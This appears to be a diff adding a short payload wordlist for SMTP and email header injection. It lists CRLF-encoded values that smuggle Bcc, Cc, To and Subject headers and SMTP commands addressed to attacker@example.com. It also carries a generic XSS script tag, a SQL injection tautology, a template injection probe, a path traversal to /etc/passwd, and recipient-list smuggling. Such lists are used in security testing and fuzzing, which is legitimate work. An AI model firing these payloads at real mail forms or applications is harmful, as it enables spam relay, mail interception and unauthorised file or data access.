@@ -1,0 +1,16 @@
+# SMTP/header injection advanced payloads
+test@example.com%0d%0aBcc:attacker@example.com
+test@example.com%0d%0aCc:attacker@example.com
+test@example.com%0d%0aTo:attacker@example.com
+test@example.com%0d%0aSubject:Injected
+test@example.com\nBcc:attacker@example.com
+test@example.com\r\nBcc:attacker@example.com
+attacker@example.com%0d%0aDATA%0d%0aInjected
+victim@example.com%0d%0aRCPT TO:<attacker@example.com>
+victim@example.com%0d%0aMAIL FROM:<attacker@example.com>
+"><script>alert(1)</script>
+' OR '1'='1
+{{7*7}}
+../../../../etc/passwd
+admin@example.com,attacker@example.com
+admin@example.com;attacker@example.com
